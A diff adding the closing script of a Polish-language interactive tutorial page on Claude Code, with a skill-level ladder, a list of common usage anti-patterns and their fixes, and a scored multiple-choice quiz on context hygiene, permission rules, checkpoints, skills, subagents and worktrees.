+    if (level === LV.length) return say(st, '🎓 <b>Wszystkie szczeble.</b> Teraz naucz tego innych: <code>/team-onboarding</code> pisze przewodnik wdrożeniowy na podstawie Twojej historii użycia.', 'ok');
+    const todo = cbs.filter(c => c.li === level && !c.cb.checked).map(c => c.h);
+    say(st, `Jesteś na poziomie <b>${level ? LV[level - 1][0] : '0 · Ciekawski'}</b>. Kolejny szczebel (${LV[level][0]}): ${todo.map(t => `<em>${t}</em>`).join('; ')}.`);
+  }
+  // pokaż najwyższy szczebel pierwszy wizualnie
+  ladder.style.display = 'flex'; ladder.style.flexDirection = 'column-reverse';
+  const PAT = [
+    ['🍲 Sesja-śmietnik', 'Jedno zadanie, potem niepowiązane pytanie, potem z powrotem. Kontekst pełen nieistotnych rzeczy. <b>Naprawa:</b> <code>/clear</code> między niepowiązanymi zadaniami; <code>/btw</code> do szybkich sprawdzeń.'],
+    ['🔁 Poprawianie w kółko', 'Źle, poprawione, dalej źle, znów poprawione — kontekst zanieczyszczony nieudanymi podejściami. <b>Naprawa:</b> po dwóch nieudanych korektach zrób <code>/clear</code> i napisz lepszy pierwszy prompt z tym, czego się nauczyłeś (albo cofnij).'],
+    ['📚 Rozdmuchany CLAUDE.md', 'Tak długi, że ważne reguły giną w szumie. <b>Naprawa:</b> przycinaj bezlitośnie; jeśli Claude już robi coś dobrze bez tej linijki, usuń ją albo zrób z niej hook.'],
+    ['🎭 Luka między zaufaniem a weryfikacją', 'Wiarygodnie wyglądający kod, który gubi przypadki brzegowe. <b>Naprawa:</b> zawsze zapewniaj weryfikację — testy, skrypty, zrzuty ekranu. Jeśli nie możesz tego zweryfikować, nie wysyłaj tego.'],
+    ['🕳️ Nieskończona eksploracja', '„Zbadaj X” bez zakresu; Claude czyta setki plików. <b>Naprawa:</b> zawężaj wąsko albo wyślij badanie do subagentów.']
+  ];
+  const pb = PAT.map(([t, fix], i) => { const b = H('button', '', t, patEl); b.onclick = () => { pb.forEach(x => x.classList.remove('on')); b.classList.add('on'); say(fixEl, fix, 'warn'); }; return b; });
+  paint();
+  registerFig(root, {
+    async first() {
+      for (const r of rungs) { r.classList.add('pulse', 'next'); await sleep(260); r.classList.remove('pulse', 'next'); }
+      paint();
+      pb[0].click();
+    }
+  });
+})();
+
+/* ---------- quiz ---------- */
+(() => {
+  const Q = [
+    ['Co najbardziej poprawia jakość wyniku Claude przy poprawianiu błędu?',
+      ['Dłuższy, grzeczniejszy prompt', 'Sposób, w jaki Claude może zweryfikować swoją pracę, np. nieprzechodzący test, który musi naprawić', 'Zawsze używanie największego modelu'], 1,
+      'Pętla to zbierz → działaj → zweryfikuj. Mając sprawdzenie, które może uruchomić, Claude znajduje własne błędy; bez niego to Ty jesteś zestawem testów.'],
+    ['Twoja sesja trwa już dwie godziny, obejmuje trzy niepowiązane zadania, a odpowiedzi robią się gorsze. Najlepszy ruch?',
+      ['Jedź dalej; auto-compact to obsłuży', '/clear i zacznij kolejne zadanie od nowa, z decyzjami zapisanymi w plikach', 'Przełącz się na większy model'], 1,
+      'Szum szkodzi, zanim okno się zapełni, a podsumowania zachowują ślady martwych tropów. /clear między niepowiązanymi zadaniami; utrwalaj decyzje w plikach.'],
+    ['Gdzie ładuje się zagnieżdżony packages/web/CLAUDE.md?',
+      ['Przy każdym starcie sesji, jak root CLAUDE.md', 'Tylko gdy Claude czyta pliki w packages/web/', 'Nigdy; czytany jest tylko root CLAUDE.md'], 1,
+      'Pliki powyżej katalogu roboczego ładują się przy starcie; zagnieżdżone ładują się na żądanie, gdy Claude pracuje w tym folderze.'],
+    ['Masz deny: Bash(aws *) i allow: Bash(aws s3 ls). Co się dzieje z "aws s3 ls"?',
+      ['Dozwolone — wygrywa bardziej specyficzna reguła', 'Odmówione — deny jest sprawdzane pierwsze i wygrywa pierwsze trafienie', 'Claude Cię pyta'], 1,
+      'Reguły są sprawdzane deny → ask → allow; wygrywa pierwsze trafienie, specyficzność nie ma znaczenia. Allow nie może wyciąć wyjątku z deny.'],
+    ['Który tryb uprawnień pasuje do zadania CI z dokładną listą dozwolonych narzędzi i bez obecnego człowieka?',
+      ['acceptEdits', 'dontAsk', 'plan'], 1,
+      'dontAsk odmawia wszystkiego, co wymagałoby pytania, więc działają tylko odczyty i wcześniej zatwierdzone narzędzia.'],
+    ['Kiedy plan mode NIE jest wart zachodu?',
+      ['Gdy potrafisz opisać diff jednym zdaniem', 'Gdy zmiana obejmuje wiele plików', 'Gdy nie znasz kodu'], 0,
+      'Planowanie ma stały koszt; zwraca się przy pracy na wielu plikach, niepewnej albo nieznanym kodzie. Diffy na jedno zdanie: po prostu je zrób.'],
+    ['Claude usunął plik komendą Bash rm, potem cofnąłeś kod do wcześniejszego checkpointu. Czy plik wrócił?',
+      ['Tak, checkpointy przywracają wszystko', 'Nie, checkpointy nie śledzą zmian zrobionych komendami Bash', 'Tylko jeśli byłeś w plan mode'], 1,
+      'Checkpointy śledzą edycje zrobione narzędziami plikowymi Claude. Zmiany zrobione przez Bash nie są przywracane — commituj często.'],
+    ['Chcesz workflow /deploy, którego Claude nigdy nie może uruchomić sam. Które ustawienie skilli?',
+      ['context: fork', 'disable-model-invocation: true', 'user-invocable: false'], 1,
+      'disable-model-invocation: true ukrywa skillę przed Claude, dopóki nie wpiszesz /deploy — i do tego momentu nie kosztuje kontekstu.'],
+    ['Dlaczego biblioteka 50 skilli nie wysadza Twojego okna kontekstu?',
+      ['Skille są skompresowane', 'Na starcie ładują się tylko nazwy i opisy; treść skilli ładuje się, gdy jest użyta', 'Tylko 5 skilli może być aktywnych naraz'], 1,
+      'Stopniowe ujawnianie: opisy przy każdym żądaniu, pełna treść przy użyciu, powiązane pliki tylko po otwarciu.'],
+    ['Główna korzyść z delegowania szerokiego wyszukiwania w kodzie do subagenta?',
+      ['Zawsze jest tańsze w tokenach', 'Czytanie plików dzieje się w jego własnym kontekście; do Twojego wraca tylko podsumowanie', 'Subagenci widzą pliki, których Claude nie widzi'], 1,
+      'Izolacja, nie cena: subagent wydaje własne tokeny, ale Twój główny kontekst zostaje czysty.'],
+    ['„Nigdy nie usuwaj plików poza projektem” musi obowiązywać zawsze. Gdzie to umieszczasz?',
+      ['W CLAUDE.md wielkimi literami', 'W hooku PreToolUse, który kończy się kodem 2 przy naruszeniu (i/lub w regule deny)', 'W stylu wyjścia'], 1,
+      'CLAUDE.md to prośba, którą model interpretuje. Hooki i reguły deny są egzekwowane przez sam Claude Code.'],
+    ['Dodajesz ten sam serwer MCP o nazwie "db" w zasięgu lokalnym i projektu. Który jest używany?',
+      ['Projektu, bo jest dzielony', 'Lokalny — pierwszeństwo: lokalny > projekt > użytkownik', 'Oba, scalone'], 1,
+      'Serwery MCP nadpisują się po nazwie: lokalny > projekt > użytkownik.'],
+    ['Potrzebujesz trzech niezależnych funkcji budowanych równolegle, tak by sesje nie nadpisywały wzajemnie swoich plików. Użyj…',
+      ['Trzech subagentów w jednej sesji', 'Trzech sesji, każda uruchomiona przez claude -w <name> (worktrees gita)', 'Jednej sesji z /loop'], 1,
+      'Worktrees dają każdej sesji własny checkout i branch, dzieląc historię.'],
+    ['Koszty tokenów skalują się z rozmiarem kontekstu. Który codzienny nawyk więc niezawodnie obniża koszt?',
+      ['Zawsze używanie najmniejszego modelu', 'Higiena kontekstu: /clear między zadaniami, szczupły CLAUDE.md, subagenci do ciężkiego czytania', 'Wyłączenie użycia narzędzi'], 1,
+      'Koszty tokenów skalują się z rozmiarem kontekstu, więc trzymanie go szczupłym to pierwsza dźwignia z listy dokumentacji — potem dopasuj model i wysiłek do zadania.']
+  ];
+  const box = $('#quiz'); let answered = 0, good = 0; const scoreEl = $('#score');
+  function upd() { scoreEl.textContent = `Wynik: ${good} / ${answered}`; }
+  Q.forEach(([q, opts, ok, why], n) => {
+    const d = H('div', 'quiz-q reveal', `<h4>${n + 1}. ${q}</h4><div class="opts"></div><div class="why">💡 ${why}</div>`, box);
+    opts.forEach((t, i) => {
+      const b = H('button', '', null, $('.opts', d)); b.textContent = t;
+      b.onclick = () => {
+        if (d.classList.contains('done')) return;
+        d.classList.add('done'); answered++;
+        if (i === ok) good++; else b.classList.add('wrong');
+        $('.opts', d).children[ok].classList.add('right');
+        $$('button', d).forEach(x => x.disabled = true);
+        upd();
+      };
+    });
+    revealIO.observe(d);
+  });
+})();
+</script>
+</body>
+</html>
